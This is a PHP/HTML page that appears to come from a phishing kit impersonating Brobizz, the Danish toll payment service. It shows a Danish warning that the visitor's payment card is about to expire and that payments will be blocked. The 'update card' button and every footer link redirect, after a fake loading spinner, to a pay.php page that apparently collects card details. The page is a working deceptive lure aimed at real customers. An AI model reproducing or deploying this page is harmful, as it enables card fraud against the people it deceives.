<?php
error_reporting(0);
date_default_timezone_set('Europe/Copenhagen');
session_start();

require '../includes/alego.php';

// Session validation
if(!isset($_SESSION['active'])){
    header('Location: index.php');
    exit();
}
?>
<!DOCTYPE html>
<html lang="fr"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover, user-scalable=no">
    <meta name="theme-color" content="#000000">
    <meta name="robots" content="noindex, nofollow">
    <meta name="google" content="notranslate">
    <link rel="icon" type="image/x-icon" href="../assets/images/favicon.ico">
    <link rel="stylesheet" href="../assets/css/main.30fa81e7.css">
    <title>Brobizz - Selvbetjening</title>
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #162f28;
            background-image: url('../Tssawer/jiissr.jpg');
            color: white;
        }
        .header {
            background-color: #19382d;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 0px 20px;
        }
        .header img {
            height: 24px;
        }
        .main-content {
            padding: 20px;
            text-align: center;
            
            background-size: cover;
            background-position: center;
        }
        .notification {
            background-color: white;
            color: black;
            padding: 20px;
            border-radius: 10px;
            margin: 20px auto;
            max-width: 500px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        .notification h2 {
            margin-top: 0;
        }
        .notification p {
            margin: 10px 0;
        }
        .notification button {
            background-color: rgb(0, 160, 80);
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
        }
        .footer {
            display: flex;
            flex-wrap: wrap;
            justify-content: space-around;
            padding: 20px;
            background-color: #19382d;
            position: fixed;
            width: 100%;
            bottom: 0;
        }
        .footer div {
            text-align: center;
            flex: 1 1 50%;
            padding: 10px 0;
        }
        .footer div img {
            width: 24px;
            height: 24px;
        }
        .footer div p {
            margin: 5px 0 0 0;
            font-size: 14px;
        }
        .dlrRqM {
            background: rgb(255, 255, 133);
            border-radius: 50%;
            height: 20px;
            width: 20px;
            position: absolute;
            top: 50%;
            left: 90%;
            display: flex;
            justify-content: center;
            align-items: center;
            color: black;
        }
        .footer a {
            color: white;
            text-decoration: none;
        }
        .footer a:hover {
            color: white;
        }
        .loading-spinner {
            border: 8px solid rgba(255, 255, 255, 0);
            border-top: 8px solid #00a64e;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            position: absolute;
            top: 50%;
            left: 45%;
            transform: translate(-50%, -50%);
            z-index: 1000;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        @media (max-width: 600px) {
            .loading-spinner {
                width: 40px;
                height: 40px;
                border-width: 6px;
            }
        }
        .loading-overlay {
            display: none;
            position: fixed;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.8);
            top: 0;
            left: 0;
            z-index: 999;
        }
        .loading-overlay.active {
            display: block;
        }
    </style>
</head>
<body>
    <div class="header">
        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><g><rect x="5" y="4" width="4.66681" height="4.66681" rx="2.3334" fill="#fff"></rect><rect x="5" y="14.8896" width="4.66681" height="4.66681" rx="2.3334" fill="#fff"></rect><rect x="14.334" y="4" width="4.66681" height="4.66681" rx="2.3334" fill="#fff"></rect><rect x="14.334" y="14.8896" width="4.66681" height="4.66681" rx="2.3334" fill="#fff"></rect></g></svg>
        <h1>Brobizz</h1>
        <a href="#" class="update-link">
        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <g>
                    <path d="M12 4C9.79086 4 8 5.79086 8 8C8 10.2091 9.79086 12 12 12C14.2091 12 16 10.2091 16 8C16 5.79086 14.2091 4 12 4ZM6 8C6 4.68629 8.68629 2 12 2C15.3137 2 18 4.68629 18 8C18 11.3137 15.3137 14 12 14C8.68629 14 6 11.3137 6 8ZM8 18C6.34315 18 5 19.3431 5 21C5 21.5523 4.55228 22 4 22C3.44772 22 3 21.5523 3 21C3 18.2386 5.23858 16 8 16H16C18.7614 16 21 18.2386 21 21C21 21.5523 20.5523 22 20 22C19.4477 22 19 21.5523 19 21C19 19.3431 17.6569 18 16 18H8Z" fill="white"></path>
                    </g></svg></a>
    </div>
    <div class="main-content">
        <h2>Velkommen Kære Kunde</h2>
        <div class="notification">  
            <h2>Dit betalingskort udløber snart</h2>
            <p>For at undgå, at dine betalinger for nummerplader hos Brobizz bliver spærret, skal du opdatere dit betalingskort.</p>
            <button onclick="showLoadingSpinner('pay.php')">Opdater betalingskort</button>
        </div>
    </div>
    <div class="footer">
        <div>
            <a href="#" class="update-link">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="sc-bZSZLb fGLQLd"><g><path d="M11.5228 13.4512H22.1751C22.6307 13.4512 23 13.8205 23 14.2761V18.3882C23 18.8437 22.6307 19.2131 22.1751 19.2131H1.82494C1.36934 19.2131 1 18.8437 1 18.3882V14.2761C1 13.8205 1.36934 13.4512 1.82494 13.4512H6.96328" stroke="white" stroke-linecap="square" stroke-linejoin="round"></path><path d="M12.2627 16.9877C12.2627 17.3493 11.9695 17.6425 11.6079 17.6425C11.2463 17.6425 10.9531 17.3493 10.9531 16.9877V15.6782C10.9531 15.3166 11.2463 15.0234 11.6079 15.0234C11.9695 15.0234 12.2627 15.3166 12.2627 15.6782V16.9877Z" stroke="white" stroke-width="0.6" stroke-linecap="square" stroke-linejoin="round"></path><path d="M17.3369 16.9877C17.3369 17.3493 17.0437 17.6425 16.6821 17.6425C16.3205 17.6425 16.0273 17.3493 16.0273 16.9877V15.6782C16.0273 15.3166 16.3205 15.0234 16.6821 15.0234C17.0437 15.0234 17.3369 15.3166 17.3369 15.6782V16.9877Z" stroke="white" stroke-width="0.6" stroke-linecap="square" stroke-linejoin="round"></path><path d="M21.4267 15.6782C21.4267 16.0398 21.1336 16.333 20.772 16.333C20.4103 16.333 20.1172 16.0398 20.1172 15.6782C20.1172 15.3166 20.4103 15.0234 20.772 15.0234C21.1336 15.0234 21.4267 15.3166 21.4267 15.6782Z" stroke="white" stroke-width="0.6" stroke-linecap="square" stroke-linejoin="round"></path><path d="M21.4267 16.9868C21.4267 17.3484 21.1336 17.6416 20.772 17.6416C20.4103 17.6416 20.1172 17.3484 20.1172 16.9868C20.1172 16.6252 20.4103 16.332 20.772 16.332C21.1336 16.332 21.4267 16.6252 21.4267 16.9868Z" stroke="white" stroke-width="0.6" stroke-linecap="square" stroke-linejoin="round"></path><path d="M13.2647 15.5145C13.3374 15.2321 13.5938 15.0234 13.8989 15.0234C14.2605 15.0234 14.5537 15.3167 14.5537 15.6783C14.5537 16.0398 14.2605 16.333 13.8989 16.333C13.5372 16.333 13.2441 16.6262 13.2441 16.9877V17.6425H14.5537" stroke="white" stroke-width="0.6" stroke-linecap="square" stroke-linejoin="round"></path><path d="M8.82469 16.333C9.18629 16.333 9.47945 16.6261 9.47945 16.9877C9.47945 17.3493 9.18629 17.6425 8.82469 17.6425H8.16992V15.0234H8.82469C9.18629 15.0234 9.47945 15.3166 9.47945 15.6782C9.47945 16.0398 9.18629 16.333 8.82469 16.333H8.16992" stroke="white" stroke-width="0.6" stroke-linecap="square" stroke-linejoin="round"></path><path d="M6.6782 16.333C7.0398 16.333 7.33296 16.6261 7.33296 16.9877C7.33296 17.3493 7.0398 17.6425 6.6782 17.6425H6.02344V15.0234H6.6782C7.0398 15.0234 7.33296 15.3166 7.33296 15.6782C7.33296 16.0398 7.0398 16.333 6.6782 16.333H6.02344" stroke="white" stroke-width="0.6" stroke-linecap="square" stroke-linejoin="round"></path><path d="M18.3184 15.5145L18.8095 15.0234V17.6425" stroke="white" stroke-width="0.6" stroke-linecap="square" stroke-linejoin="round"></path><path d="M18.3184 17.6406H19.3005" stroke="white" stroke-width="0.6" stroke-linecap="square" stroke-linejoin="round"></path><path d="M4.14258 13.4512V19.2131" stroke="white" stroke-width="0.6" stroke-linecap="square" stroke-linejoin="round"></path><path d="M19.4207 10.6086C19.4843 11.1768 19.1238 11.7057 18.5715 11.8532C17.5239 12.1329 15.6762 12.5985 13.3975 13.055C11.121 13.5112 9.23803 13.7932 8.163 13.9388C7.59856 14.0152 7.06329 13.669 6.90143 13.1229C6.66677 12.331 6.34514 11.1853 6.16396 10.2806C5.98168 9.37108 5.83379 8.1683 5.74317 7.33551C5.68154 6.76868 6.04203 6.2422 6.5929 6.09513C7.64128 5.81529 9.48695 5.35038 11.7624 4.89449C14.0401 4.43814 15.9239 4.15604 16.9987 4.01054C17.5651 3.93383 18.102 4.2828 18.2618 4.83152C18.4688 5.54257 18.7494 6.58553 18.9754 7.71387C19.1996 8.83307 19.3397 9.88389 19.4207 10.6086H19.4207Z" stroke="white" stroke-width="1.2" stroke-linecap="square" stroke-linejoin="round"></path><path d="M17.1469 7.62862C15.9776 7.86287 14.8397 7.10492 14.6055 5.93555" stroke="white" stroke-width="0.7" stroke-linecap="square" stroke-linejoin="round"></path><path d="M17.413 8.95239C15.5129 9.33309 13.6639 8.10138 13.2832 6.20117" stroke="white" stroke-width="0.7" stroke-linecap="square" stroke-linejoin="round"></path><path d="M17.6792 10.2742C15.0482 10.8014 12.4881 9.09582 11.9609 6.46484" stroke="white" stroke-width="0.7" stroke-linecap="square" stroke-linejoin="round"></path></g></svg>
            <p>Bizz og nummerplade</p>
            </a>
        </div>
        <div>
            <a href="#" class="update-link">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="sc-hgJWpk bWCCTz"><g><path d="M21 21H4C3.44772 21 3 20.5523 3 20V3H5V19H21V21ZM8.373 16L7 14.656L11.856 9.9C12.2383 9.52848 12.8467 9.52848 13.229 9.9L15.456 12.081L19.627 8L21 9.344L16.144 14.1C15.7617 14.4715 15.1533 14.4715 14.771 14.1L12.543 11.918L8.374 16H8.373Z" fill="white"></path></g></svg>
            <p>Ture og forbrug</p>
            </a>
        </div>
        <div>
            <a href="#" class="update-link">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="sc-hrJsxi fzvhso"><g><path d="M4.1421 4.00014L6.00913 16.1358C6.02271 16.236 6.05113 16.3314 6.0921 16.4199C6.21543 16.6862 6.45246 16.8891 6.74088 16.9662C6.82899 16.9899 6.92133 17.0017 7.01578 17.0001H18C18.4416 17.0001 18.8309 16.7105 18.9578 16.2875L21.9578 6.28749C22.0487 5.98471 21.991 5.65682 21.8023 5.40321C21.6136 5.1496 21.3161 5.00014 21 5.00014H6.31948L5.99058 2.86233C5.97826 2.77295 5.95413 2.68733 5.91981 2.60712C5.85751 2.46104 5.76213 2.33451 5.64429 2.23533C5.53497 2.14314 5.40561 2.07396 5.26367 2.03526C5.17434 2.0108 5.0806 1.99855 4.9847 2.00014H3C2.44772 2.00014 2 2.44785 2 3.00014C2 3.55242 2.44772 4.00014 3 4.00014H4.1421ZM7.85794 15.0001L6.62717 7.00014H19.656L17.256 15.0001H7.85794Z" fill="white"></path><path d="M10 20.0001C10 21.1047 9.10457 22.0001 8 22.0001C6.89543 22.0001 6 21.1047 6 20.0001C6 18.8956 6.89543 18.0001 8 18.0001C9.10457 18.0001 10 18.8956 10 20.0001Z" fill="white"></path><path d="M19 20.0001C19 21.1047 18.1046 22.0001 17 22.0001C15.8954 22.0001 15 21.1047 15 20.0001C15 18.8956 15.8954 18.0001 17 18.0001C18.1046 18.0001 19 18.8956 19 20.0001Z" fill="white"></path></g></svg>
            <p>Bestil</p>
            </a>
        </div>
        <div>
            <div class="dlrRqM">!</div>
            <a href="#" class="update-link">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="sc-bOTDDd laXMRw"><g><path d="M4 5H20C21.1 5 22 5.7875 22 6.75V17.25C22 18.2125 21.1 19 20 19H4C2.9 19 2 18.2125 2 17.25V6.75C2 5.7875 2.9 5 4 5Z" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path><path d="M2 11H21" stroke="white" stroke-width="2"></path><path d="M16 14H19" stroke="white" stroke-width="2" stroke-linecap="round"></path></g></svg>
            <p>Betalingskort</p>
            </a>
        </div>
    </div>
    <div id="loadingOverlay" class="loading-overlay">
        <div class="loading-spinner"></div>
    </div>
<script>
    function showLoadingSpinner(url) {
        document.getElementById('loadingOverlay').classList.add('active');
        setTimeout(function() {
            window.location.href = url;
        }, 3000);
    }
    document.querySelectorAll('.update-link').forEach(function(link) {
        link.addEventListener('click', function(event) {
            event.preventDefault();
            showLoadingSpinner(link.href);
        });
    });
</script>

</body></html>